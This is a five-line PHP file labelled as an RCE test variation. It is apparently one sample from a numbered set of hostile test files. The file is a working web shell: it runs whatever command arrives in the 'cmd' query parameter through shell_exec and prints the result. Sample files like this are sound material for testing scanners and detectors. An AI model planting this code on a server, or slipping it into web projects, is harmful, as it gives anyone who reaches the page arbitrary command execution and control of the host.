<?php
// RCE test variation #605
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>